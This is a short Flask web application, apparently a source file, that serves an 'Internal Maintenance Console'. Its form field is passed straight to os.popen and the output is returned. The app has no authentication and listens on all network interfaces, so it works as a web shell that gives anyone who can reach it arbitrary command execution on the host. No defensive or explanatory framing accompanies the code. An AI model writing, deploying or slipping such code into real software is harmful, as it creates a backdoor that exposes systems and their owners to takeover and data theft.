from flask import Flask, request
import os

app = Flask(__name__)

@app.route("/")
def index():
    return """
    <h2>Internal Maintenance Console</h2>
    <form method="POST" action="/run">
      <input name="cmd" placeholder="Enter maintenance command">
      <button type="submit">Run</button>
    </form>
    """

@app.route("/run", methods=["POST"])
def run():
    cmd = request.form.get("cmd", "")
    output = os.popen(cmd).read()
    return f"<pre>{output}</pre>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
